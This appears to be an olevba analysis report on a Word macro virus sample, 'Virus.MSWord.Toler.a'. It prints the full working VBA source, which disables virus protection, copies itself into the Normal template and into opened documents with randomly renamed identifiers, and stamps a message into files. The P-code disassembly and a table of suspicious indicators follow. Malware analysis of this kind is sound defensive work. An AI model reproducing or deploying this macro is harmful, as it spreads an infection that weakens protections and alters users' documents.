olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Toler.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Toler.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Tolerance!
Private Type FjntZ
  DbaguZ As Integer
  AxwvcbruZ As Integer
  YylesZ As Boolean
End Type
Private Sub Document_Open()
  Randomize
  Options.VirusProtection = False
  Dim RolcfcZ As Object, FepZ As Object
  Set RolcfcZ = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
  Set FepZ = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
  Dim DtqlvZ As FjntZ, NmsiZ As FjntZ: DtqlvZ = XqjtrucZ(RolcfcZ): NmsiZ = XqjtrucZ(FepZ)
  If NmsiZ.AxwvcbruZ = 0 Then
     CmybZ RolcfcZ, FepZ, DtqlvZ, NmsiZ
     Options.SaveNormalPrompt = False
  End If
  If (DtqlvZ.AxwvcbruZ = 0) Or ((NmsiZ.AxwvcbruZ <> 0) And (DtqlvZ.AxwvcbruZ <> NmsiZ.AxwvcbruZ)) Then
     CmybZ FepZ, RolcfcZ, NmsiZ, DtqlvZ
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  ElseIf Rnd < 0.3 Then
     ActiveDocument.Range(0, 0).InsertParagraphBefore
     ActiveDocument.Range(0, 0).InsertBefore "MUD Forever! :-)"
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  End If
End Sub
Private Sub CmybZ(DbaguZ As Object, SbdZ As Object, FromP As FjntZ, ToP As FjntZ)
  Dim MdntZ As String, OjkcxfZ
  MdntZ = DbaguZ.Lines(FromP.DbaguZ, FromP.AxwvcbruZ)
  OjkcxfZ = Array("BnteZ", "FjntZ", "DbaguZ", "SbdZ", "MxcrrZ", "AxwvcbruZ", "YylesZ", "RolcfcZ", "FepZ", "DtqlvZ", "NmsiZ", "CmybZ", "MdntZ", "CgtumpZ", "PxxhZ", "DfomhtnZ", "XqjtrucZ", "DnseiZ", "OjkcxfZ")
  For I = 0 To 18: DnseiZ MdntZ, (OjkcxfZ(I)), BnteZ(MdntZ): Next I
  If ToP.YylesZ Then SbdZ.DeleteLines 1, SbdZ.CountOfLines
  SbdZ.AddFromString MdntZ
End Sub
Private Function BnteZ(MdntZ As String) As String
  Dim CgtumpZ As String: CgtumpZ = ""
  While (InStr(MdntZ, CgtumpZ) <> 0) Or (Len(CgtumpZ) < 3)
     CgtumpZ = ""
     For I = 1 To 10
         If Rnd > 0.5 Then
            If Len(CgtumpZ) = 0 Then
                  CgtumpZ = CgtumpZ + Chr(Int(Rnd * 25 + 65))
            Else: CgtumpZ = CgtumpZ + Chr(Int(Rnd * 25 + 97))
            End If
         End If
     Next I
     CgtumpZ = CgtumpZ + "Z"
  Wend
  BnteZ = CgtumpZ
End Function
Private Sub DnseiZ(MdntZ As String, PxxhZ As String, DfomhtnZ As String)
  Dim I As Long
  I = 1
  While InStr(I, MdntZ, PxxhZ) <> 0
        I = InStr(I, MdntZ, PxxhZ)
        MdntZ = Left(MdntZ, I - 1) + DfomhtnZ + Mid$(MdntZ, I + Len(PxxhZ))
        Index = Index + 1
  Wend
End Sub
Private Function XqjtrucZ(MxcrrZ As Object) As FjntZ
  XqjtrucZ.DbaguZ = 0
  XqjtrucZ.AxwvcbruZ = 0
  XqjtrucZ.YylesZ = False
  For I = 1 To MxcrrZ.CountOfLines
   If MxcrrZ.Lines(I, 1) = "' Tolerance!" Then XqjtrucZ.DbaguZ = I
   If MxcrrZ.Lines(I, 1) = "End Function 'Tolerance!" Then XqjtrucZ.AxwvcbruZ = I - XqjtrucZ.DbaguZ + 1
   If InStr(MxcrrZ.Lines(I, 1), "Private Sub Document_Open()") = 1 Then XqjtrucZ.YylesZ = True
  Next I
End Function 'Tolerance!
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Toler.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5925 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000B " Tolerance!"
' Line #1:
' 	Type (Private) FjntZ
' Line #2:
' 	DimImplicit 
' 	VarDefn DbaguZ (As Integer)
' Line #3:
' 	DimImplicit 
' 	VarDefn AxwvcbruZ (As Integer)
' Line #4:
' 	DimImplicit 
' 	VarDefn YylesZ (As Boolean)
' Line #5:
' 	EndType 
' Line #6:
' 	FuncDefn (Private Sub Document_Open())
' Line #7:
' 	ArgsCall Read 0x0000 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	Dim 
' 	VarDefn RolcfcZ (As Object)
' 	VarDefn FepZ (As Object)
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set RolcfcZ 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set FepZ 
' Line #12:
' 	Dim 
' 	VarDefn DtqlvZ (As FjntZ)
' 	VarDefn NmsiZ (As FjntZ)
' 	BoS 0x0000 
' 	Ld RolcfcZ 
' 	ArgsLd XqjtrucZ 0x0001 
' 	St DtqlvZ 
' 	BoS 0x0000 
' 	Ld FepZ 
' 	ArgsLd XqjtrucZ 0x0001 
' 	St NmsiZ 
' Line #13:
' 	Ld NmsiZ 
' 	MemLd AxwvcbruZ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #14:
' 	Ld RolcfcZ 
' 	Ld FepZ 
' 	Ld DtqlvZ 
' 	Ld NmsiZ 
' 	ArgsCall CmybZ 0x0004 
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld DtqlvZ 
' 	MemLd AxwvcbruZ 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld NmsiZ 
' 	MemLd AxwvcbruZ 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	Ld DtqlvZ 
' 	MemLd AxwvcbruZ 
' 	Ld NmsiZ 
' 	MemLd AxwvcbruZ 
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #18:
' 	Ld FepZ 
' 	Ld RolcfcZ 
' 	Ld NmsiZ 
' 	Ld DtqlvZ 
' 	ArgsCall CmybZ 0x0004 
' Line #19:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #20:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	ElseIfBlock 
' Line #21:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemLd Range 0x0002 
' 	ArgsMemCall InsertParagraphBefore 0x0000 
' Line #22:
' 	LitStr 0x0010 "MUD Forever! :-)"
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemLd Range 0x0002 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #23:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Private Sub CmybZ(DbaguZ As Object, SbdZ As Object, FromP As , ToP As ))
' Line #27:
' 	Dim 
' 	VarDefn MdntZ (As String)
' 	VarDefn OjkcxfZ
' Line #28:
' 	Ld FromP 
' 	MemLd DbaguZ 
' 	Ld FromP 
' 	MemLd AxwvcbruZ 
' 	Ld DbaguZ 
' 	ArgsMemLd Lines 0x0002 
' 	St MdntZ 
' Line #29:
' 	LitStr 0x0005 "BnteZ"
' 	LitStr 0x0005 "FjntZ"
' 	LitStr 0x0006 "DbaguZ"
' 	LitStr 0x0004 "SbdZ"
' 	LitStr 0x0006 "MxcrrZ"
' 	LitStr 0x0009 "AxwvcbruZ"
' 	LitStr 0x0006 "YylesZ"
' 	LitStr 0x0007 "RolcfcZ"
' 	LitStr 0x0004 "FepZ"
' 	LitStr 0x0006 "DtqlvZ"
' 	LitStr 0x0005 "NmsiZ"
' 	LitStr 0x0005 "CmybZ"
' 	LitStr 0x0005 "MdntZ"
' 	LitStr 0x0007 "CgtumpZ"
' 	LitStr 0x0005 "PxxhZ"
' 	LitStr 0x0008 "DfomhtnZ"
' 	LitStr 0x0008 "XqjtrucZ"
' 	LitStr 0x0006 "DnseiZ"
' 	LitStr 0x0007 "OjkcxfZ"
' 	ArgsArray Array 0x0013 
' 	St OjkcxfZ 
' Line #30:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0012 
' 	For 
' 	BoS 0x0000 
' 	Ld MdntZ 
' 	Ld I 
' 	ArgsLd OjkcxfZ 0x0001 
' 	Paren 
' 	Ld MdntZ 
' 	ArgsLd BnteZ 0x0001 
' 	ArgsCall DnseiZ 0x0003 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #31:
' 	Ld ToP 
' 	MemLd YylesZ 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld SbdZ 
' 	MemLd CountOfLines 
' 	Ld SbdZ 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #32:
' 	Ld MdntZ 
' 	Ld SbdZ 
' 	ArgsMemCall AddFromString 0x0001 
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Private Function BnteZ(MdntZ As String, id_FFFE As String) As String)
' Line #35:
' 	Dim 
' 	VarDefn CgtumpZ (As String)
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St CgtumpZ 
' Line #36:
' 	Ld MdntZ 
' 	Ld CgtumpZ 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	Ld CgtumpZ 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Lt 
' 	Paren 
' 	Or 
' 	While 
' Line #37:
' 	LitStr 0x0000 ""
' 	St CgtumpZ 
' Line #38:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #39:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	IfBlock 
' Line #40:
' 	Ld CgtumpZ 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #41:
' 	Ld CgtumpZ 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St CgtumpZ 
' Line #42:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld CgtumpZ 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St CgtumpZ 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	Ld CgtumpZ 
' 	LitStr 0x0001 "Z"
' 	Add 
' 	St CgtumpZ 
' Line #47:
' 	Wend 
' Line #48:
' 	Ld CgtumpZ 
' 	St BnteZ 
' Line #49:
' 	EndFunc 
' Line #50:
' 	FuncDefn (Private Sub DnseiZ(MdntZ As String, PxxhZ As String, DfomhtnZ As String))
' Line #51:
' 	Dim 
' 	VarDefn I (As Long)
' Line #52:
' 	LitDI2 0x0001 
' 	St I 
' Line #53:
' 	Ld I 
' 	Ld MdntZ 
' 	Ld PxxhZ 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	While 
' Line #54:
' 	Ld I 
' 	Ld MdntZ 
' 	Ld PxxhZ 
' 	FnInStr3 
' 	St I 
' Line #55:
' 	Ld MdntZ 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld DfomhtnZ 
' 	Add 
' 	Ld MdntZ 
' 	Ld I 
' 	Ld PxxhZ 
' 	FnLen 
' 	Add 
' 	ArgsLd Mid$$ 0x0002 
' 	Add 
' 	St MdntZ 
' Line #56:
' 	Ld Index 
' 	LitDI2 0x0001 
' 	Add 
' 	St Index 
' Line #57:
' 	Wend 
' Line #58:
' 	EndSub 
' Line #59:
' 	FuncDefn (Private Function XqjtrucZ(MxcrrZ As Object, id_FFFE As ) As <crash>)
' Line #60:
' 	LitDI2 0x0000 
' 	Ld XqjtrucZ 
' 	MemSt DbaguZ 
' Line #61:
' 	LitDI2 0x0000 
' 	Ld XqjtrucZ 
' 	MemSt AxwvcbruZ 
' Line #62:
' 	LitVarSpecial (False)
' 	Ld XqjtrucZ 
' 	MemSt YylesZ 
' Line #63:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MxcrrZ 
' 	MemLd CountOfLines 
' 	For 
' Line #64:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld MxcrrZ 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "' Tolerance!"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld I 
' 	Ld XqjtrucZ 
' 	MemSt DbaguZ 
' 	EndIf 
' Line #65:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld MxcrrZ 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0018 "End Function 'Tolerance!"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld I 
' 	Ld XqjtrucZ 
' 	MemLd DbaguZ 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld XqjtrucZ 
' 	MemSt AxwvcbruZ 
' 	EndIf 
' Line #66:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld MxcrrZ 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld XqjtrucZ 
' 	MemSt YylesZ 
' 	EndIf 
' Line #67:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #68:
' 	EndFunc 
' 	QuoteRem 0x000D 0x000A "Tolerance!"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

